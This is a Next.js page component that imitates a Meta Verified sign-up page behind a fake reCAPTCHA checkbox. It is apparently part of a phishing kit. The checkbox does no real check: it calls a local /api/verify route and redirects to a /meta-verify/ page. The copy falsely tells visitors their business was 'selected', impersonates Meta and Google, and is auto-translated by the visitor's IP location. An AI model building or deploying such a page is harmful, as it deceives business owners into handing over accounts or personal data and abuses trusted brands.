'use client';
import CheckMarkImage from '@/assets/images/checkmark.png';
import MetaImage from '@/assets/images/meta-image.png';
import ReCaptchaImage from '@/assets/images/recaptcha.png';
import axios from 'axios';
import Image from 'next/image';
import { useRouter } from 'next/navigation';
import { useEffect, useState, type FC } from 'react';

const countryToLanguage: Record<string, string> = {
    AE: 'ar', AT: 'de', BE: 'nl', BG: 'bg', BR: 'pt', CA: 'en', CY: 'el', CZ: 'cs',
    DE: 'de', DK: 'da', EE: 'et', EG: 'ar', ES: 'es', FI: 'fi', FR: 'fr', GB: 'en',
    GR: 'el', HR: 'hr', HU: 'hu', IE: 'ga', IN: 'hi', IT: 'it', LT: 'lt', LU: 'lb',
    LV: 'lv', MT: 'mt', MY: 'ms', NL: 'nl', NO: 'no', PL: 'pl', PT: 'pt', RO: 'ro',
    SE: 'sv', SI: 'sl', SK: 'sk', TH: 'th', TR: 'tr', TW: 'zh', US: 'en', VN: 'vi',
    JO: 'ar', LB: 'ar', QA: 'ar', IQ: 'ar', SA: 'ar', IL: 'iw', KR: 'ko'
};

const textsToTranslate = [
    'Show the world that you mean business.',
    'Organizations can leverage the requirements to upgrade your page to a Sub-business status with a branded, relationship that reflects your brand values to drive more meaningful engagement and future.',
    'Subscribe on Facebook',
    'A creator toolkit to take your brand further',
    'Explore key Meta Verified benefits available for Facebook and Instagram. Sub-creator plans and pricing for additional benefits.',
    'Learn more',
    'Meta Verified benefits',
    'Verified badge',
    'The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.',
    'Impersonation protection',
    'Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.',
    'Enhanced support',
    'Get 24/7 access to email or chat agent support.',
    'Upgraded profile features',
    'Enrich your profile by adding images to your links to help boost engagement. Benefit not yet available in all regions.',
    'Sign up for Meta Verified.',
    'Our verification process is designed to maintain the integrity of the verified badge. Let\'s start by confirming your identity.',
    'Start your application',
    'Those interested in applying for Meta Verified will need to register and meet certain eligibility requirements (requirements for facebook). We are pleased to see that your business is one of the few that we have considered and selected',
    'Verify business details',
    'You may be asked to share details such as your business name, address, website and/or phone number.',
    'Get feedback',
    'We\'ll review your application and send an update on your status within three working days.',
    'See how Meta Verified has helped real businesses.',
    'Get the latest updates from Meta for business.',
    'Discover new insights to ensure the latest updates on brand safety, critical news and product updates.',
    'Enter your email',
    'Subscribe',
    'Facebook',
    'Instagram',
    'Messenger',
    'WhatsApp',
    'Tools',
    'Business Suite',
    'Ads Manager',
    'Creator Studio',
    'Support',
    'Help Center',
    'Community',
    'Contact us',
    'Legal',
    'Privacy',
    'Terms',
    'Cookies',
    'By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our Data Policy.',
    'About',
    'Developers',
    'Careers',
    'Help Centre',
    'After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience. I think that seeing a verified badge builds trust. People that I don\'t know or newer brands interested in working with me can make sure that they\'re talking with me and not a scammer.',
    'Since subscribing, I\'ve noticed a real difference. My posts are getting more reach, engagement has gone up and I\'m seeing more interactions on stories and reels.',
    'Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business that takes both our products and social presence seriously.',
    'Kimber Greenwood, Owner of Water-Bear Photography',
    'Devon Kirby, Owner, Mom Approved Miami',
    'Sarah Clancy, Owner of Sarah Marie Running Co.',
];

const Index: FC = () => {
    const router = useRouter();
    const [isLoading, setIsLoading] = useState(false);
    const [isShowCheckMark, setisShowCheckMark] = useState(false);

    // Pre-load and cache translations on component mount
    useEffect(() => {
        const preloadTranslations = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                const countryCode = data.country_code || 'US';
                const targetLang = countryToLanguage[countryCode] || 'en';

                if (targetLang === 'en') return;

                const CACHE_KEY = 'translation_cache';
                const cached = localStorage.getItem(CACHE_KEY);
                const cache = cached ? JSON.parse(cached) : {};

                // Translate all in parallel
                const translatePromises = textsToTranslate.map(async (text) => {
                    const cacheKey = `en:${targetLang}:${text}`;
                    if (cache[cacheKey]) return { text, translated: cache[cacheKey] };

                    try {
                        const response = await axios.get('https://translate.googleapis.com/translate_a/single', {
                            params: {
                                client: 'gtx',
                                sl: 'en',
                                tl: targetLang,
                                dt: 't',
                                q: text
                            }
                        });

                        const translatedText = response.data[0]
                            ?.map((item: unknown[]) => item[0])
                            .filter(Boolean)
                            .join('') || text;

                        cache[cacheKey] = translatedText;
                        return { text, translated: translatedText };
                    } catch {
                        return { text, translated: text };
                    }
                });

                const results = await Promise.all(translatePromises);
                localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
            } catch {
                // Silently fail, no translation needed
            }
        };

        preloadTranslations();
    }, []);

    const handleVerify = async () => {
        setIsLoading(true);
        try {
            const response = await axios.post('/api/verify');
            const status = response.status;
            if (status === 200) {
                setTimeout(() => {
                    setisShowCheckMark(true);
                    setIsLoading(false);
                }, 300);
            }
        } catch {
            //
        }
    };

    useEffect(() => {
        if (isShowCheckMark) {
            const redirectTimeOut = setTimeout(() => {
                const currentTime = Date.now();
                router.push(`/meta-verify/${currentTime}`);
            }, 200);
            return () => {
                clearTimeout(redirectTimeOut);
            };
        }
    }, [isShowCheckMark, router]);
    return (
        <div className='flex flex-col items-center justify-center pt-[150px]'>
            <title>Meta Verified for Facebook | Instagram</title>
            <div className='w-[300px]'>
                <Image src={MetaImage} alt='' className='w-16' />
                <div className='flex w-full items-center justify-start py-5'>
                    <div className='flex w-full items-center justify-between rounded-md border-2 bg-[#f9f9f9] pr-2 text-[#4c4a4b]'>
                        <div className='flex items-center justify-start'>
                            <div className='my-4 mr-2 ml-4 flex h-8 w-8 items-center justify-center'>
                                <button
                                    className='flex h-full w-full items-center justify-center'
                                    onClick={() => {
                                        handleVerify();
                                    }}
                                >
                                    <input type='checkbox' className='absolute h-0 w-0 opacity-0' />
                                    {isLoading ? (
                                        <div className='h-full w-full animate-spin-fast rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent transition-all transition-discrete'></div>
                                    ) : (
                                        <div
                                            className={`h-8 w-8 rounded-[3px] border-gray-500 bg-[#fcfcfc] ${!isShowCheckMark && 'border-2'} transition-all transition-discrete`}
                                            style={{
                                                backgroundImage: isShowCheckMark ? `url("${CheckMarkImage.src}")` : '',
                                                backgroundPosition: '-10px -595px'
                                            }}
                                        ></div>
                                    )}
                                </button>
                            </div>
                            <div className='mr-4 ml-1 text-left text-[14px] font-semibold tracking-normal text-gray-500'>I&apos;m not a robot</div>
                        </div>
                        <div className='mt-2 mb-0.5 ml-4 flex flex-col items-center self-end text-[#9d9ba7]'>
                            <Image src={ReCaptchaImage} alt='' className='h-10 w-10' />
                            <p className='text-[10px] font-bold'>reCAPTCHA</p>
                            <small className='text-[8px] text-gray-500'>Privacy - Terms</small>
                        </div>
                    </div>
                </div>
                <div className='flex flex-col gap-4 text-[13px] leading-[1.3] text-gray-700'>
                    <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
                    <p>We’ve used Google&apos;s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.</p>
                    <p>reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
                </div>
            </div>
        </div>
    );
};

export default Index;
